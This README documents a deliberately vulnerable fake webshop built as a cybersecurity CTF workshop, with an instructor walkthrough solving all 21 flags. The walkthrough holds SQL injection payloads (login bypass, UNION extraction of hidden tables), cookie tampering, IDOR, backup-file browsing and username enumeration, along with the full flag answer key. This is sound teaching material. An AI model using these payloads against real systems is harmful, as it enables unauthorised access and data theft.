# TechHaven Electronics — Cybersecurity Workshop CTF

A deliberately vulnerable fake electronics webshop built with **Blazor Web App (.NET 10)** and **SQLite**, designed as a Capture The Flag (CTF) platform for cybersecurity workshops.

Students attack the site as if it were a real target. **21 flags** are hidden across the application using techniques ranging from basic source inspection to multi-step SQL injection.

---

## Table of Contents

1. [Requirements](#requirements)
2. [Running the Project](#running-the-project)
3. [Hosting on a Windows Machine](#hosting-on-a-windows-machine)
4. [Project Structure](#project-structure)
5. [The CTF Challenges — Overview](#the-ctf-challenges--overview)
6. [Instructor Walkthrough (Full Solutions)](#instructor-walkthrough-full-solutions)
7. [Instructor Panel](#instructor-panel)
8. [Resetting Between Sessions](#resetting-between-sessions)

---

## Requirements

| Tool | Version |
|------|---------|
| .NET SDK | 10.0 or later |
| OS | Windows / Linux / macOS |
| Browser | Any modern browser with DevTools |

Install .NET 10: https://dotnet.microsoft.com/download

---

## Running the Project

### Development (your machine)

```bash
cd SecretWebsite
dotnet run
```

The app starts on:

| Protocol | URL |
|----------|-----|
| HTTP | http://localhost:5210 |
| HTTPS | https://localhost:7182 |

> The SQLite database (`techhaven.db`) is created and seeded automatically on first run.
> It lives in the build output folder (`bin/Debug/net10.0/techhaven.db`).

To reset the database (clear all submissions, re-seed), simply delete `techhaven.db` and restart.

### Using a specific profile

```bash
dotnet run --launch-profile http    # HTTP only
dotnet run --launch-profile https   # HTTP + HTTPS
```

---

## Hosting on a Windows Machine

So your students can reach the site from their own machines on the same network:

### 1. Publish a self-contained release build

```powershell
dotnet publish -c Release -r win-x64 --self-contained true -o C:\TechHaven
```

### 2. Run it on a specific IP / port

```powershell
cd C:\TechHaven
.\SecretWebsite.exe --urls "http://0.0.0.0:5000"
```

The app is now reachable at `http://<YOUR-IP>:5000` from any machine on the network.

### 3. Find your machine's IP

```powershell
ipconfig
# Look for "IPv4 Address" under your network adapter, e.g. 192.168.1.42
```

Students then browse to `http://192.168.1.42:5000`.

### 4. Windows Firewall (if students can't connect)

```powershell
# Run as Administrator
netsh advfirewall firewall add rule name="TechHaven CTF" dir=in action=allow protocol=TCP localport=5000
```

### Optional: Run as a background service

```powershell
# Install as a Windows Service (run once, survives reboots)
sc.exe create TechHavenCTF binPath="C:\TechHaven\SecretWebsite.exe --urls http://0.0.0.0:5000" start=auto
sc.exe start TechHavenCTF

# To stop and remove:
sc.exe stop TechHavenCTF
sc.exe delete TechHavenCTF
```

---

## Project Structure

```
SecretWebsite/
├── Components/
│   ├── Pages/
│   │   ├── Home.razor              # Flag 1 — HTML comment + console.log
│   │   │                           # Flag 10 — localStorage token
│   │   ├── About.razor             # Flag 3 — HTTP response header
│   │   ├── Products.razor          # Flag 2 (hidden div) + Flag 7 (UNION injection)
│   │   │                           # Flag 16 — category filter SQLi (?cat=)
│   │   ├── Product.razor           # Flag 12 — IDOR product detail (/product/{id})
│   │   ├── Checkout.razor          # Flag 17 — discount code SQLi
│   │   ├── Login.razor             # Flag 6 — SQL injection auth bypass
│   │   │                           # Flag 20 — username enumeration
│   │   ├── ForgotPassword.razor    # Flag 18 — forgot-password form SQLi
│   │   ├── Admin.razor             # Flag 6 — shown after bypass
│   │   ├── StaffPortal.razor       # Flag 20 — shown after ghost login
│   │   ├── Vip.razor               # Flag 5 — cookie manipulation
│   │   ├── HiddenWarehouse.razor   # Flag 4 — robots.txt discovery
│   │   ├── Changelog.razor         # Flag 9 — sitemap discovery
│   │   ├── MemberSearch.razor      # Flag 19 — community member SQLi
│   │   ├── Support.razor           # Flag 21 — accidental console.log in production
│   │   ├── Scoreboard.razor        # Flag submission + leaderboard
│   │   └── Instructor.razor        # Password-protected instructor panel
│   ├── App.razor                   # Document shell — Flag 8 (HTML comment before </body>)
│   └── Layout/
│       └── MainLayout.razor        # Navbar + footer
├── Services/
│   ├── DatabaseService.cs          # All DB logic — vulnerable + patched queries
│   ├── AuthStateService.cs         # Per-circuit login state
│   └── FlagService.cs              # Flag registry and validation (21 flags)
├── wwwroot/
│   ├── robots.txt                  # Hints at hidden paths (Flag 4)
│   ├── sitemap.xml                 # Lists /changelog (Flag 9)
│   ├── security.txt                # Flag 11 — security disclosure file
│   ├── backup/
│   │   ├── index.txt               # Fake directory listing — hints at config.txt
│   │   └── config.txt              # Flag 14 — exposed backup config + API key
│   └── js/ctf.js                   # Cookie + localStorage JS helpers
│                                   # printSupportDebug() — Flag 21
├── Program.cs                      # HTTP header middleware (Flag 3)
│                                   # /api/debug (Flag 13), /api/internal (Flag 15)
└── README.md
```

---

## The CTF Challenges — Overview

> **Tell students:** "TechHaven Electronics has **21 security flags** hidden across the site. Find them, note down the value, and submit on the Scoreboard page."

| # | Flag Value | Category | Difficulty |
|---|-----------|----------|-----------|
| 1 | `RECON_01` | Source / Console | ⭐ Easy |
| 2 | `SHADOW_02` | DOM Inspection | ⭐ Easy |
| 3 | `HEADER_03` | HTTP Headers | ⭐⭐ Medium |
| 4 | `WAREHOUSE_04` | Recon / robots.txt | ⭐ Easy |
| 5 | `COOKIE_05` | Cookie Manipulation | ⭐⭐ Medium |
| 6 | `SQLINJECT_06` | SQL Injection (Auth Bypass) | ⭐⭐⭐ Hard |
| 7 | `UNION_07` | SQL Injection (UNION) | ⭐⭐⭐⭐ Expert |
| 8 | `COMMENT_08` | HTML Source Comment | ⭐ Easy |
| 9 | `SITEMAP_09` | Sitemap Recon | ⭐ Easy |
| 10 | `LOCALSTORAGE_10` | Browser localStorage | ⭐ Easy |
| 11 | `WELLKNOWN_11` | security.txt | ⭐ Easy |
| 12 | `IDOR_12` | Insecure Direct Object Reference | ⭐⭐ Medium |
| 13 | `APIDEBUG_13` | Exposed API Endpoint | ⭐⭐ Medium |
| 14 | `BACKUP_14` | Force Browsing / Backup File | ⭐⭐ Medium |
| 15 | `APIKEY_15` | API Key Authentication | ⭐⭐⭐ Hard |
| 16 | `SQLCAT_16` | SQL Injection (Category Filter) | ⭐⭐⭐ Hard |
| 17 | `SQLDISCOUNT_17` | SQL Injection (Discount Code) | ⭐⭐⭐ Hard |
| 18 | `SQLFORGOT_18` | SQL Injection (Forgot Password) | ⭐⭐⭐ Hard |
| 19 | `SQLUSERS_19` | SQL Injection (Member Search) | ⭐⭐⭐ Hard |
| 20 | `ENUMERATE_20` | Username Enumeration + Weak Creds | ⭐⭐⭐⭐ Expert |
| 21 | `CONSOLELOG_21` | Accidental Console Log | ⭐ Easy |

---

## Instructor Walkthrough (Full Solutions)

---

### FLAG 1 — RECON_01
**Page:** `/` (Home)
**Category:** Source code / Browser Console
**Difficulty:** ⭐

**Method A — View Page Source:**

Right-click the page → *View Page Source* (`Ctrl+U`). Search for `Dev Notes`:

```html
<!-- TechHaven Dev Notes — build 2.3.1
     RkxBRzE6IFJFQ09OXzAx -->
```

Decode in the browser console:
```javascript
atob("RkxBRzE6IFJFQ09OXzAx")
// → "FLAG1: RECON_01"
```

**Method B — Browser Console:**

Open DevTools → Console. On page load the app prints:
```
[TechHaven Debug] RkxBRzE6IFJFQ09OXzAx
Hint: this looks encoded. Try atob("RkxBRzE6IFJFQ09OXzAx") in the console.
```

**Submit:** `RECON_01`

---

### FLAG 2 — SHADOW_02
**Page:** `/products`
**Category:** DOM Inspection
**Difficulty:** ⭐

Open DevTools → Elements tab, search for `__debug`. Find the hidden div:

```html
<div id="__debug" style="display:none;" aria-hidden="true">
    RkxBRzI6IFNIQURPV18wMg==
</div>
```

```javascript
atob("RkxBRzI6IFNIQURPV18wMg==")
// → "FLAG2: SHADOW_02"
```

**Submit:** `SHADOW_02`

---

### FLAG 3 — HEADER_03
**Page:** `/about`
**Category:** HTTP Response Headers
**Difficulty:** ⭐⭐

DevTools → **Network** tab → reload the page → click the `about` request → **Response Headers**:

```
X-Debug-Token: FLAG3: HEADER_03
```

**Submit:** `HEADER_03`

---

### FLAG 4 — WAREHOUSE_04
**Page:** `/hidden-warehouse`
**Category:** Recon / robots.txt
**Difficulty:** ⭐

Browse to `/robots.txt`:
```
Disallow: /hidden-warehouse
```
Navigate to `/hidden-warehouse` — flag is displayed on the page.

**Submit:** `WAREHOUSE_04`

---

### FLAG 5 — COOKIE_05
**Page:** `/vip`
**Category:** Cookie Manipulation
**Difficulty:** ⭐⭐

The home page sets `customer_tier=standard`. The VIP page grants access if the value is `vip`.

DevTools → **Application** → **Cookies** → change `customer_tier` value to `vip` → reload.

**Submit:** `COOKIE_05`

---

### FLAG 6 — SQLINJECT_06
**Page:** `/login` → `/admin`
**Category:** SQL Injection — Auth Bypass
**Difficulty:** ⭐⭐⭐

The login query is built by string concatenation:
```sql
SELECT username, role FROM users WHERE username = '[INPUT]' AND password = '[INPUT]'
```

**Bypass payloads:**

| Username | Password | Effect |
|----------|----------|--------|
| `admin' --` | *(anything)* | Comments out the password check |
| `' OR '1'='1' --` | *(anything)* | Always-true condition |

After bypass, the admin panel at `/admin` displays the flag.

**Submit:** `SQLINJECT_06`

---

### FLAG 7 — UNION_07
**Page:** `/products` (search bar)
**Category:** SQL Injection — UNION
**Difficulty:** ⭐⭐⭐⭐

The products search query structure is hinted in the page source:
```
SELECT id, name, description, price, category FROM products WHERE name LIKE '%query%'
```

Paste into the search box:
```
' UNION SELECT id, flag_value, hint, 0.0, flag_number FROM flags --
```

A result card appears showing the flag value and hint text extracted from the `flags` table.

**Submit:** `UNION_07`

---

### FLAG 8 — COMMENT_08
**Page:** Any page (shared layout)
**Category:** HTML Source Comment
**Difficulty:** ⭐

Right-click any page → *View Page Source* (`Ctrl+U`). Scroll to the very bottom and find the comment just before the closing `</body>` tag:

```html
<!-- internal build notes: flag=COMMENT_08 | branch=release/2.3 | remove before deploy! -->
</body>
```

> **Note:** This comment is in the `<body>` section, not in the `<footer>` element — look past the footer markup.

**Teaching moment:** Developer notes in HTML source are visible to anyone — never leave credentials, flags, or internal notes in HTML comments.

**Submit:** `COMMENT_08`

---

### FLAG 9 — SITEMAP_09
**Page:** `/changelog`
**Category:** Sitemap Recon
**Difficulty:** ⭐

Browse to `/sitemap.xml`. It lists all public URLs including `/changelog`, which is not in the navbar.

Navigate to `/changelog` — the flag is displayed on the page.

**Teaching moment:** `sitemap.xml` is a standard file that search engines use. Attackers routinely check it to discover unlisted pages.

**Submit:** `SITEMAP_09`

---

### FLAG 10 — LOCALSTORAGE_10
**Page:** `/` (Home) — check any page after visiting Home
**Category:** Browser localStorage
**Difficulty:** ⭐

When the Home page loads, it writes a base64-encoded token to `localStorage`:

DevTools → **Application** tab → **Local Storage** → select the site → find key `th_debug_token`.

The value is base64-encoded. Decode it in the console:
```javascript
atob(localStorage.getItem("th_debug_token"))
// → "FLAG10: LOCALSTORAGE_10"
```

The hint is also visible in `ctf.js`:
```javascript
// Dev note: session cache written to localStorage key "th_debug_token" on page load
```

**Submit:** `LOCALSTORAGE_10`

---

### FLAG 11 — WELLKNOWN_11
**Page:** `/security.txt`
**Category:** security.txt Disclosure
**Difficulty:** ⭐

Navigate to `/security.txt`. Security researchers always check this standard file for contact and disclosure information. Near the bottom:

```
# FLAG11: WELLKNOWN_11
# If you found this file — good instinct.
```

**Teaching moment:** `security.txt` (RFC 9116) is a standard file that organisations publish to tell researchers how to report vulnerabilities. Always check it on targets.

**Submit:** `WELLKNOWN_11`

---

### FLAG 12 — IDOR_12
**Page:** `/product/{id}`
**Category:** Insecure Direct Object Reference (IDOR)
**Difficulty:** ⭐⭐

The products page lists 10 products. Each card now has a **Details** link pointing to `/product/{id}`. By guessing IDs beyond the visible range, students discover a hidden draft product.

Try: `/product/11` — this returns "Prototype Unit X-11", a DRAFT product with the flag in its description. The product appears in the database but is filtered out of the public listing — however there is no authorisation check on the detail endpoint itself.

**Teaching moment:** Always enforce access control at the data layer, not just the UI layer. Hiding a record from a list doesn't protect it if the detail endpoint has no auth check.

**Submit:** `IDOR_12`

---

### FLAG 13 — APIDEBUG_13
**Page:** `/api/debug`
**Category:** Exposed Debug API Endpoint
**Difficulty:** ⭐⭐

Browse or `curl` to `/api/debug`. The endpoint returns a JSON object:

```json
{
  "version": "2.3.1-dev",
  "environment": "production",
  "database": "SQLite",
  "debug_mode": true,
  "internal_token": "FLAG13: APIDEBUG_13",
  ...
}
```

**Teaching moment:** Debug endpoints should never be reachable in production. Common paths to try: `/api/debug`, `/api/status`, `/api/health`, `/_debug`, `/info`.

**Submit:** `APIDEBUG_13`

---

### FLAG 14 — BACKUP_14
**Page:** `/backup/config.txt`
**Category:** Force Browsing / Exposed Backup
**Difficulty:** ⭐⭐

**Step 1 — Discover the backup path:**

`/robots.txt` (from Flag 4) lists `/backup` as a disallowed path. Browse to `/backup/index.txt` to find a fake directory listing:

```
Files:
  - config.txt        [2026-01-15]  internal configuration snapshot
  ...
```

**Step 2 — Fetch the file:**

Browse to `/backup/config.txt`. The file contains fake internal configuration including an API key, SMTP credentials, and the flag:
```
# FLAG14: BACKUP_14
```

**Teaching moment:** Backup files, configuration dumps, and old files committed to public folders are a common real-world finding. Always check `/backup/`, `/old/`, `/.env`, `/config.bak`, etc.

**Submit:** `BACKUP_14`

---

### FLAG 15 — APIKEY_15
**Page:** `/api/internal`
**Category:** API Key Authentication
**Difficulty:** ⭐⭐⭐

This is a two-step chain:

**Step 1** — Find the API key in `/backup/config.txt` (Flag 14):
```
internal_api_key = th-internal-4829af
```

**Step 2** — Use the key to authenticate the `/api/internal` endpoint:

```bash
curl -H "X-API-Key: th-internal-4829af" http://localhost:5210/api/internal
```

Response:
```json
{
  "status": "authenticated",
  "flag": "FLAG15: APIKEY_15",
  ...
}
```

**Teaching moment:** API keys found in exposed files can directly unlock protected endpoints. Multi-step exploit chains are common in real penetration tests.

**Submit:** `APIKEY_15`

---

### FLAG 16 — SQLCAT_16
**Page:** `/products?cat=`
**Category:** SQL Injection — Category Filter
**Difficulty:** ⭐⭐⭐

The category filter buttons on the products page use a URL parameter (`?cat=`). The hint is visible in the page source:
```
<!-- Debug: query = SELECT id, name, description, price, category FROM products WHERE category = 'cat' -->
```

The query is built by string concatenation — inject via the URL:

```
/products?cat=Laptops' UNION SELECT 1,secret_key,secret_value,0.0,'SECRET' FROM secrets --
```

A result card appears showing the contents of the `secrets` table, including the flag.

**Submit:** `SQLCAT_16`

---

### FLAG 17 — SQLDISCOUNT_17
**Page:** `/checkout`
**Category:** SQL Injection — Discount Code
**Difficulty:** ⭐⭐⭐

The checkout page has a discount code input. The hint in the page source:
```
<!-- Debug: SELECT code, discount_pct, description FROM promo_codes WHERE code = 'input' AND active = 1 -->
```

The `AND active = 1` filter hides deactivated codes. Inject to bypass it:

```
' OR '1'='1' --
```
or more targeted:
```
SAVE10' OR active=0 --
```

All rows from `promo_codes` are returned, including the inactive one containing the flag in its description.

**Submit:** `SQLDISCOUNT_17`

---

### FLAG 18 — SQLFORGOT_18
**Page:** `/forgot-password`
**Category:** SQL Injection — Forgot Password Form
**Difficulty:** ⭐⭐⭐

The forgot password form takes a username. The page source comment shows the query structure:
```
<!-- Debug: SELECT username, password FROM users WHERE username = 'input' -->
```

Use a UNION injection to extract a second table. The query returns 2 columns (`username`, `password`), so the UNION needs 2 columns too:

```
' UNION SELECT email, token FROM newsletter_subscribers --
```

The response shows all rows from `newsletter_subscribers`, including one entry whose token column contains the flag.

**Submit:** `SQLFORGOT_18`

---

### FLAG 19 — SQLUSERS_19
**Page:** `/community`
**Category:** SQL Injection — Member Search (LIKE)
**Difficulty:** ⭐⭐⭐

The community member search uses a `LIKE '%query%'` pattern. Hint in page source:
```
<!-- Debug: SELECT id, username, badge FROM community_members WHERE username LIKE '%query%' -->
```

**Simplest approach** — enter a single `%` as the search term:
```
%
```
This matches all usernames, returning every member including the hidden `__404__` account whose badge field contains the flag.

**Alternative injection:**
```
' OR '1'='1
```

**Submit:** `SQLUSERS_19`

---

### FLAG 20 — ENUMERATE_20
**Page:** `/login` → `/staff-portal`
**Category:** Username Enumeration + Weak Credentials
**Difficulty:** ⭐⭐⭐⭐

The login page now returns **different error messages** depending on whether the username exists:

| Scenario | Error message |
|----------|---------------|
| Username doesn't exist | *"No account found with that username."* |
| Username exists, wrong password | *"Incorrect password."* |

**Step 1 — Find the username:**

Visit `/community` — the member cards show a user named `ghost` with a *"Former Staff"* badge. This is the username to target.

**Step 2 — Enumerate via login errors:**

Try logging in with `ghost` and a wrong password. The login page returns different errors depending on whether the username exists:

| Scenario | Error message |
|----------|---------------|
| Username doesn't exist | *"No account found with that username."* |
| Username exists, wrong password | *"Incorrect password."* |

`ghost` returns *"Incorrect password."* — confirming the account exists.

**Step 3 — Crack the weak password:**

The `ghost` account uses the password `ghost123` — trivially guessable with common passwords or a short wordlist.

**Step 4 — Log in:**

Log in as `ghost` / `ghost123`. Because the role is `staff`, the app redirects to `/staff-portal` instead of `/admin`, where the flag is displayed.

**Teaching moment:** Different error messages for "user not found" vs "wrong password" allow an attacker to enumerate valid account names. Combined with weak passwords, this is a complete account takeover chain.

**Submit:** `ENUMERATE_20`

---

### FLAG 21 — CONSOLELOG_21
**Page:** `/support`
**Category:** Accidental Console Log in Production
**Difficulty:** ⭐

Navigate to `/support` (linked in the navbar as **Support**). The page is a standard customer help centre — FAQs and contact details.

Open DevTools → **Console** tab. On page load the app prints a styled debug message that a developer accidentally left behind:

```
[Support::init]  Ticket system ready. debug_token=CONSOLELOG_21
```

**Teaching moment:** `console.log()` calls ship to the browser in production just like any other JavaScript. Developers often leave debug output in place thinking "no one will notice" — but anyone with DevTools open will see it immediately.

**Submit:** `CONSOLELOG_21`

---

## Instructor Panel

A password-protected page is available at `/instructor` (not linked in the UI).

It shows:
- Live stats: teams active, flags captured, wrong attempts
- Per-flag progress bars showing how many teams found each flag
- A **Clear all submissions** button with confirmation

**Default password:** `TechHaven2026!`

To change it, edit `appsettings.json`:
```json
"InstructorPassword": "YourNewPassword"
```

---

## Resetting Between Sessions

**Option A — Instructor panel (recommended):**
Browse to `/instructor`, log in, click *Clear all submissions*. This only clears scoreboard data — flags and seed data are preserved.

**Option B — Delete the database (full reset):**
```bash
# Stop the app, then:
del bin\Debug\net10.0\techhaven.db   # Windows
rm bin/Debug/net10.0/techhaven.db    # Linux/macOS
# Restart — DB is recreated and re-seeded automatically
```
